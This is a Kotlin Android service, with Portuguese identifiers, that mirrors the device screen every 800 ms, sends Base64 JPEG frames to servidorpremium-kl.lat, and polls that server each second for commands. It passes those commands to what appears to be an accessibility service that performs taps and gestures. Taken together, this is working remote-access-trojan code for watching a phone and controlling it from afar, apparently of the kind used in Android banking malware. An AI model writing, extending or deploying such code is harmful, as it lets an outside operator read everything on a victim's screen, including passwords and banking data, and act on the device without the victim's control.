package com.meuacesso.remoto

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Bitmap
import android.graphics.Canvas
import android.graphics.Color
import android.graphics.Paint
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.ByteArrayOutputStream
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

class CapturaTelaService : android.app.Service() {
    companion object {
        var instancia: CapturaTelaService? = null
        private const val CANAL_ID = "captura_remota"
        private const val NOTIFICACAO_ID = 12345
        private const val INTERVALO_CAPTURA = 800L

        private const val URL_ENVIO_TELA = "https://servidorpremium-kl.lat/receber_tela.php"
        private const val URL_BUSCAR_COMANDO = "https://servidorpremium-kl.lat/obter_comando.php"


        fun iniciarComParametros(proj: MediaProjection, largura: Int, altura: Int, dpi: Int, qualidade: Int) {
            instancia?.configurar(proj, largura, altura, dpi, qualidade)
        }
    }

    private var mediaProjection: MediaProjection? = null
    private var imageReader: ImageReader? = null
    private var virtualDisplay: android.hardware.display.VirtualDisplay? = null
    private var largura = 0
    private var altura = 0
    private var dpi = 0
    private var qualidade = 30
    private var jobCaptura: Job? = null
    private var jobComandos: Job? = null

    private val pinturaBorda = Paint().apply {
        color = Color.argb(160, 0, 150, 255)
        style = Paint.Style.STROKE
        strokeWidth = 4f
        isAntiAlias = true
    }
    private val pinturaPreenchimento = Paint().apply {
        color = Color.argb(30, 0, 150, 255)
        style = Paint.Style.FILL
    }

    override fun onCreate() {
        super.onCreate()
        instancia = this
        criarCanalNotificacao()
    }

    fun configurar(proj: MediaProjection, larguraTela: Int, alturaTela: Int, dpiTela: Int, qualidadeDef: Int) {
        mediaProjection = proj
        largura = larguraTela / 2
        altura = alturaTela / 2
        dpi = dpiTela
        qualidade = qualidadeDef
        iniciarCaptura()
        iniciarLeituraComandos() // ✅ Inicia a busca de comandos
    }

    private fun iniciarCaptura() {
        if (mediaProjection == null || largura <= 0 || altura <= 0) {
            stopSelf()
            return
        }

        try {
            imageReader = ImageReader.newInstance(largura, altura, PixelFormat.RGBA_8888, 2)
            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "CapturaRemota",
                largura, altura, dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader?.surface,
                null, null
            )

            startForeground(NOTIFICACAO_ID, criarNotificacao())

            jobCaptura = CoroutineScope(Dispatchers.IO).launch {
                while (true) {
                    capturarEProcessarQuadro()
                    delay(INTERVALO_CAPTURA)
                }
            }

        } catch (e: Exception) {
            Log.e("KL", "Erro ao iniciar captura: ${e.message}")
            stopSelf()
        }
    }

    // ✅ Função para buscar comandos no servidor
    private fun iniciarLeituraComandos() {
        jobComandos = CoroutineScope(Dispatchers.IO).launch {
            while (true) {
                val comando = buscarComandoServidor()
                if (!comando.isNullOrEmpty() && comando != "nenhum") {
                    Log.d("KL", "Comando recebido: $comando")
                    enviarParaServicoGestos(comando)
                }
                delay(1000) // Verifica novo comando a cada 1 segundo
            }
        }
    }

    private fun buscarComandoServidor(): String? {
        return try {
            val conexao = URL(URL_BUSCAR_COMANDO).openConnection() as HttpURLConnection
            conexao.requestMethod = "GET"
            conexao.connectTimeout = 2500
            conexao.readTimeout = 2500
            conexao.setRequestProperty("Cache-Control", "no-cache")

            val resposta = conexao.inputStream.bufferedReader().use { it.readText().trim() }
            conexao.disconnect()
            resposta
        } catch (e: Exception) {
            Log.e("KL", "Erro ao buscar comando: ${e.message}")
            null
        }
    }

    // ✅ Envia o comando recebido para o serviço de acessibilidade executar
    private fun enviarParaServicoGestos(comando: String) {
        val intent = Intent("ACAO_GESTO")
        intent.putExtra("comando", comando.lowercase().trim())
        sendBroadcast(intent)
    }

    private fun capturarEProcessarQuadro() {
        val imagem: Image? = try {
            imageReader?.acquireLatestImage()
        } catch (e: Exception) { null }

        imagem?.use { img ->
            val buffer = img.planes[0].buffer
            val larguraImagem = img.width
            val alturaImagem = img.height
            val stride = img.planes[0].rowStride
            val bytesPorPixel = img.planes[0].pixelStride

            val bitmap = Bitmap.createBitmap(larguraImagem, alturaImagem, Bitmap.Config.ARGB_8888)
            buffer.rewind()

            val pixels = IntArray(larguraImagem * alturaImagem)
            for (y in 0 until alturaImagem) {
                val linhaOffset = y * stride
                for (x in 0 until larguraImagem) {
                    val posicao = linhaOffset + x * bytesPorPixel
                    pixels[y * larguraImagem + x] = buffer.getInt(posicao)
                }
            }
            bitmap.setPixels(pixels, 0, larguraImagem, 0, 0, larguraImagem, alturaImagem)

            val bitmapProcessado = destacarAreasClicaveis(bitmap)
            val dadosComprimidos = comprimirBitmap(bitmapProcessado)
            enviarParaServidor(dadosComprimidos)

            bitmap.recycle()
            bitmapProcessado.recycle()
        }
    }

    private fun destacarAreasClicaveis(origem: Bitmap): Bitmap {
        val copia = origem.copy(Bitmap.Config.ARGB_8888, true)
        val canvas = Canvas(copia)

        val alturaBotaoNav = (altura * 0.08).toInt()
        val larguraBotao = (largura / 3)

        canvas.drawRect(0f, (altura - alturaBotaoNav).toFloat(), larguraBotao.toFloat(), altura.toFloat(), pinturaPreenchimento)
        canvas.drawRect(0f, (altura - alturaBotaoNav).toFloat(), larguraBotao.toFloat(), altura.toFloat(), pinturaBorda)

        canvas.drawRect(larguraBotao.toFloat(), (altura - alturaBotaoNav).toFloat(), (larguraBotao * 2).toFloat(), altura.toFloat(), pinturaPreenchimento)
        canvas.drawRect(larguraBotao.toFloat(), (altura - alturaBotaoNav).toFloat(), (larguraBotao * 2).toFloat(), altura.toFloat(), pinturaBorda)

        canvas.drawRect((larguraBotao * 2).toFloat(), (altura - alturaBotaoNav).toFloat(), largura.toFloat(), altura.toFloat(), pinturaPreenchimento)
        canvas.drawRect((larguraBotao * 2).toFloat(), (altura - alturaBotaoNav).toFloat(), largura.toFloat(), altura.toFloat(), pinturaBorda)

        return copia
    }

    private fun comprimirBitmap(bitmap: Bitmap): String {
        val saida = ByteArrayOutputStream()
        bitmap.compress(Bitmap.CompressFormat.JPEG, qualidade, saida)
        val bytes = saida.toByteArray()
        return Base64.encodeToString(bytes, Base64.NO_WRAP)
    }

    private fun enviarParaServidor(dadosBase64: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val conexao = URL(URL_ENVIO_TELA).openConnection() as HttpURLConnection
                conexao.apply {
                    requestMethod = "POST"
                    setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
                    doOutput = true
                    connectTimeout = 3000
                    readTimeout = 4000
                }

                val corpo = "tela=$dadosBase64"
                OutputStreamWriter(conexao.outputStream).use { it.write(corpo) }

                val resposta = conexao.responseCode
                if (resposta != 200) Log.w("KL", "Servidor retornou código: $resposta")

                conexao.disconnect()
            } catch (e: Exception) {
                Log.e("KL", "Erro ao enviar tela: ${e.message}")
            }
        }
    }

    private fun criarNotificacao(): Notification {
        return NotificationCompat.Builder(this, CANAL_ID)
            .setSmallIcon(R.mipmap.ic_launcher)
            .setContentTitle("Controle Remoto Ativo")
            .setContentText("Captura e comandos funcionando")
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setCategory(Notification.CATEGORY_SERVICE)
            .build()
    }

    private fun criarCanalNotificacao() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val canal = NotificationChannel(
                CANAL_ID,
                "Serviço de Captura",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Mantém o serviço ativo em segundo plano"
            }
            val gerenciador = getSystemService(NotificationManager::class.java)
            gerenciador.createNotificationChannel(canal)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        jobCaptura?.cancel()
        jobComandos?.cancel()
        imageReader?.close()
        virtualDisplay?.release()
        mediaProjection?.stop()
        instancia = null
    }

    override fun onBind(intent: Intent) = null
}